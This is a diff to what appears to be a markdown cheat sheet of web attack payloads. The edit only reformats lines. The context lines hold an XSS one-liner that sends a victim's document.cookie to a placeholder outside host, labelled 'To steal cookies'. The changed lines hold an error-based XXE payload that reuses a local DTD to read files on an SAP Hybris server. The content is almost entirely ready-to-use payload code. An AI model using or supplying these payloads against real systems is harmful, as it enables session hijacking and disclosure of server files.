@@ -15,9 +15,7 @@
  - `var url="https://any.host.name/",params="asd="+document.cookie,http=new XMLHttpRequest;http.open("GET",url+"?"+params,!0),http.send(null);` To steal cookies
 
 ### XML External Entity
- - ```
-<?xml version="1.0" ?>
-<!DOCTYPE message [
+ - ```<?xml version="1.0" ?><!DOCTYPE message [
     <!ENTITY % local_dtd SYSTEM "https://docs.oracle.com/cd/E13153_01/wlcp/wlss40/sip-app_1_0.dtd.txt">
     <!ENTITY % condition 'aaa)>
         <!ENTITY &#x25; file SYSTEM "/opt/hybris/deployments/dist.tar.deploy/hybris/confi">
@@ -26,8 +24,7 @@
         &#x25;error;
         <!ELEMENT aa (bb'>
     %local_dtd;
-]>
-<data>
+]><data>
    <lastName>asd</lastName>
     <notes>atest</notes>
     <town>Lucca</town>
